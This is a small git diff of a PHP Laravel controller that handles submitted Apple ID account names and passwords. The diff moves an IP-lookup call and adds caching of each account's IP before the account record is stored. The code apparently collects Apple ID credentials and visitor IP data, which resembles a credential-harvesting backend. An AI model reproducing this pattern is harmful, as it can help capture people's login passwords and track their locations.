@@ -46,8 +46,6 @@ class AppleClientController extends Controller
         Session::flash('account', $request->input('account', ''));
         Session::flash('password', $request->input('password', ''));
 
-        $this->ipInfo();
-
         return view('index/index');
     }
 
@@ -79,6 +77,9 @@ class AppleClientController extends Controller
 
         $account = $validatedData['accountName'];
         $password = $validatedData['password'];
+
+        $this->cacheAccountIp($account);
+        $this->ipInfo();
 
         $apple = Account::updateOrCreate(
             ['appleid' => $account], // 用于查找账户的条件
